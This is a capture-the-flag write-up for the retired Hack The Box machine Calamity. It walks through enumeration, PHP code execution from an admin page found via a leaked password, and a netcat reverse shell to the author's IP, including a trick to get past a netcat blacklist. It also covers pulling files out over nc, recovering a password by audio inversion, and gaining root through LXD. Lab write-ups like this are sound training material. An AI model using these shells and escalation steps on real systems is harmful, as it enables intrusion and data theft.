# Calamity

This is the write-up for the box Calamity that got retired at the 20th January 2018.
My IP address was 10.10.14.16 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.27    calamity.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/calamity.nmap 10.10.10.27
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
|   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
|_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Brotherhood Software
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

On the web page there is an image and some text that says the e-store is under development and nothing interesting in the source code.
Lets look for hidden paths with **Gobuster**:
```markdown
gobuster -u http://10.10.10.27 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
```

It finds the index page _/uploads_ directory that has no content and _/admin.php_ that displays a login prompt.
Looking at the HTML source code of that page, it has a comment that says:
```markdown
<!-- password is:skoupidotenekes-->
```

It is possible to log in with the username _admin_ and the found password and it forwards us to a message:

![Web message](https://kyuu-ji.github.io/htb-write-up/calamity/calamity_web-1.png)

This page parses HTML code and if it gets PHP code it also works.
```markdown
<?php system("whoami"); ?>
```

So we have Code Execution to start a reverse shell:
```markdown
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9001 >/tmp/f"); ?>
```

The listener on my IP and port 9001 start a connection and instantly closes it. Lets look into the files in the _/home_ if there is something interesting:
```markdown
<?php system("find /home"); ?>
```

The user _xalvas_ has a file called _intrusions_ that blacklists **Netcat** and other potential intrusions.
To get a reverse shell, we try to run `nc` from the RAM disk _/dev/shm_ to get around the blacklisting:

Copy `nc` to _/dev/shm_ and rename it:
```markdown
<?php system("cp /bin/nc /dev/shm/test"); ?>
```

Make it executable:
```markdown
<?php system("chmod 755 /dev/shm/test"); ?>
```

Execute the `test` binary:
```markdown
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| /dev/shm/test 10.10.14.16 9001 >/tmp/f"); ?>
```

Now the listener on my IP and port 9001 starts a reverse shell that does not instantly close and we are the user _www-data_.

## Privilege Escalation

### Privilege Escalation to user

The home folder of _xalvas_ has many different files that should be analyzed on the local machine, so we download them:
```markdown
# Local machine:
nc -lvnp 1234 > rick.wav
nc -lvnp 1234 > xouzouris.mp3
nc -lvnp 1234 > recov.wav

# Box
/dev/shm/test 10.10.14.16 1234 < /home/xalvas/alarmclocks/rick.wav
/dev/shm/test 10.10.14.16 1234 < /home/xalvas/alarmclocks/xouzouris.mp3
/dev/shm/test 10.10.14.16 1234 < /home/xalvas/recov.wav
```

After listening to them, they don't give any hints or unusual sounds.
The files _rick.wav_ and _revoc.wav_ are almost the same file size:
```markdown
-rw-r--r-- 1 root root 3196724 Jan  6 18:32 recov.wav
-rw-r--r-- 1 root root 3196668 Jan  6 18:25 rick.wav
-rw-r--r-- 1 root root 2645839 Jan  6 18:25 xouzouris.mp3
```

To compare the wave files, the **Python module audiodiff** will help:
```python
import audiodiff

audiodiff.audio_equal('recov.wav','rick.wav')
```

The output is _False_ which means even though the audio files sound the same, they have different sound waves.
When having the same audio file several times but with different waves, it is a good idea to inverse one of the files and play it against the other audio file to detect hidden data. If someone plays the exact inverse of a sound file, they cancel each other out and we can't hear anything.
In this case the sound waves are different, so somewhere in the audio we should hear something.
Lets do this with any audio editing program like **Audacity**.

Open _rick.wav_ and import _recov.wav_:

![Audacity open files](https://kyuu-ji.github.io/htb-write-up/calamity/calamity_audacity-1.png)

Highlighting one of the waves and inverting them against each other:

![Audacity invert waves](https://kyuu-ji.github.io/htb-write-up/calamity/calamity_audacity-2.png)

After listening to it, it starts with some numbers and at 16 seconds to the end we hear:
```markdown
Your password is 185...
```

So it starts at 16 seconds and loops from second 0 and the whole sentence is:
```markdown
Your password is 18547936..*
```

Trying this password for the user _xalvas_ on SSH and it works:
```markdown
ssh xalvas@10.10.10.27
```

### Privilege Escalation to root

To get any attack surface on the box, executing any **Linux Enumeration** script will be helpful:
```markdown
wget http://10.10.14.16 | bash LinEnum.sh
```

The user _xalvas_ is in the group _lxd_ which means that **LXC (Linux Containers)** is running on this box that is used for some virtualization and containerization on Linux.
To exploit this, we create a small _Alpine Linux_ with the [LXD Alpine Linux image builder](https://github.com/saghul/lxd-alpine-builder).
```markdown
./build-alpine.sh -a i686
```

This creates a tar file that we upload to the Calamity box:
```markdown
scp alpine-v3.11-i686-20200106_1943.tar.gz xalvas@10.10.10.27:
```

Now import this image into LXC:
```markdown
lxc image import alpine-v3.11-i686-20200106_1943.tar.gz --alias alpine
```

With `lxc image list` we can check if the image got imported. The next step is to create the machine with the name _privesc_:
```markdown
lxc init alpine privesc -c security.privileged=true
```

Using `lxc list` to check if the machine got created. Now it needs a hard drive that gets mounted on _/mnt/root_:
```markdown
lxc config device add privesc host-root disk source=/ path=/mnt/root/
```

Starting the container and after that executing _/bin/sh_:
```markdown
lxc start privesc

lxc exec privesc /bin/sh
```

Now we are in the container as root and mounted the file system to _/mnt/root_ where we can get the flag!
